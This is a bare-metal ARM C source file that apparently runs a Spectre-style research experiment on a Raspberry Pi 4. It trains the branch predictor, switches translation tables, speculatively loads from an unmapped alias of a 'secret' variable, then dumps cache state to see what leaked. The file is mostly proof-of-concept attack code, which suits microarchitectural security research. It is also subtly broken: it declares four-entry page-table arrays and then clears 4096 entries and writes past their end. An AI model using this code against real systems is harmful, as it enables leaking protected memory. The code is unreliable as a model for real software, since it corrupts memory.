#include "config.h"

#ifdef RUN_CACHE

#include "lib/printf.h"
#include "mmu.h"
#include "cache.h"

#define BARRIER_DSB_ISB() __asm__ __volatile__("DSB SY \t\n ISB \t\n")
#define BARRIER_ISB() __asm__ __volatile__("ISB \t\n")
static cache_state cache;

#define CACHEABLE(x, offset) ((void *)(((uint64_t)(&x)) + offset))

#define __UNUSED __attribute__((unused))
#define __ALIGN(x) __attribute__ ((aligned (x)))
#define PAGE_SIZE (4096)
/* page table memory */
uint64_t page_table1_l1[4] __ALIGN(PAGE_SIZE);
uint64_t page_table2_l1[4] __ALIGN(PAGE_SIZE);

void reset_cache_experiment() {
  disable_mmu();
}

void find_cache_valid(cache_state c) {
  printf("----\n");
  printf("print_cache_valid\n");
  printf("----\n");
  for (uint64_t set=0; set<SETS; set++) {
    for (uint64_t way=0; way<WAYS; way++) {
      cache_line * l1 = &c[set][way];
      if (l1->valid) {
        //printf("%i\t::%i\t:: tag: %x\n", set, way, l1->tag);
	debug_line(l1,TRUE);
      }
    }
  }
  printf("----\n");
}

static void __basic_mmu__(void) {
  init_mmu();
  for(int i = 0; i < 4096; i++){
    page_table1_l1[i] = 0;
    page_table2_l1[i] = 0;
  }
  // Set up translation table entries in memory with looped store
  // instructions.
  // Set the level 1 translation table.
  l1_set_translation(page_table1_l1, 0, 0, 0);
  l1_set_translation(page_table2_l1, 0, 0, 0);
  page_table2_l1[4] = 0x32;

  l1_set_translation(page_table1_l1, 0x40000000, 0, 1);
  l1_set_translation(page_table2_l1, 0x40000000, 0, 1);

  // Executable Inner and Outer Shareable.
  // R/W at all ELs secure memory
  // AttrIdx=000 Device-nGnRnE.
  // The third entry is 1GB block from 0x80000000 to 0xBFFFFFFF.
  //l1_set_translation(page_table1_l1, 0x80000000, 0, 1);
  //l1_set_translation(page_table2_l1, 0x80000000, 0, 1);

  // TODO: dirty quick fix for rpi4, overwrites the last mapping, second cacheable alias
  l1_set_translation(page_table1_l1, 0xC0000000, 0, 0);
  l1_set_translation(page_table2_l1, 0xC0000000, 0, 0);

  tlbiall_el3();
  set_l1(page_table1_l1);
  enable_mmu();
}

#define BRANCH_TRAINS   6          /* train branch predictor 6 times */
uint64_t _bound = page_table1_l1;  /* cache miss is needed accessing this */

volatile uint64_t secret0 = 0x83;

uint64_t * cbl1_ptr = (uint64_t*)(CACHEABLE(secret0, 0x40000000));  // this is mapped addres
uint64_t * cbl2_ptr = (uint64_t*)(CACHEABLE(secret0, 0x80000000));  // this is umapped adddress and raised exception

void attack(uint64_t idx) {
  /* Set TTBR */
  switch_l1(idx);

  /* To make sure nothing is in the cache before reaching to the conditional expression */
  flush_d_cache(0);
  flush_d_cache(1);
  tlbiall_el3();

  if (idx == _bound){
    asm volatile("ldr x6, [x10]");
  }
}

#ifndef SINGLE_EXPERIMENTS
void run_cache_experiment()
{
  unsigned int i,j, x, idx, tries;
  uint64_t malicious_x =  &cbl2_ptr[1], training_x = &cbl1_ptr[1], tmp;

  __basic_mmu__();
  
  flush_d_cache(0);
  flush_d_cache(1);
  printf("page tabele bases are %x and %x and activated is %x\n", page_table1_l1, page_table2_l1, get_l1());
  printf("secret address is %x \n",&secret0);

  //tmp = cbl2_ptr[1];

  for(tries = 1; tries > 0; tries--) {
    for (j = 1; j <= BRANCH_TRAINS * 4; j++) {
      //tmp = cbl1_ptr[tries];
      // Taken from the Spectre's original source code
      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if  j%6==0
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j %  BRANCH_TRAINS) - 1) & ~0xFFFF;            /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16));                                 /* Set x=-1 if j%6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* loading memory address into x10 which is passed to the victim, it is either training_x or malicious_x  */
      asm volatile ("mov x10, %0" : : "r" (x));
    
      idx = (((j - 1) %  BRANCH_TRAINS) == BRANCH_TRAINS - 1)? &page_table2_l1 : page_table1_l1;
      printf("x = %x and idx = %x and bound = %x \n", x, idx, _bound);

      attack(idx);
    }
  }

  save_cache_state(cache);
  find_cache_valid(cache);
}

#endif // !SINGLE_EXPERIMENTS

#endif // RUN_CACHE




